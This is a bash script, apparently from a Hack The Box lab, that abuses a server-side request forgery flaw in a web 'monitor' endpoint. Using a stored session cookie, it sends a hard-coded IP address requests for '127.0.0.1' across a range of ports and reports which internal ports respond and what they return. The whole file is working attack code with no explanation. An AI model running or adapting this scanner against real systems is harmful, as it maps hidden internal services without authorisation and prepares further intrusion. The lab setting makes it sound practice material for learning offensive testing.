#!/bin/bash
COOKIE="/c/HTB/43.200.51.235/http/svcm_cookies.txt"
BASE="http://43.200.51.235:8081/ops-status/monitor"
START="$1"
END="$2"
for port in $(seq "$START" "$END"); do
  R=$(curl -s -G -b "$COOKIE" "$BASE" --data-urlencode "target=127.0.0.1:$port" --data-urlencode "path=/" --max-time 5)
  if echo "$R" | grep -q "Connection refused"; then
    :
  elif echo "$R" | grep -q "status-err"; then
    ERR=$(echo "$R" | grep -oP 'status-err">\K[^<]*')
    echo "PORT $port -> ERR: $ERR"
  else
    OK=$(echo "$R" | grep -oP 'status-ok">\K[^<]*')
    echo "PORT $port -> OK: $OK"
  fi
done
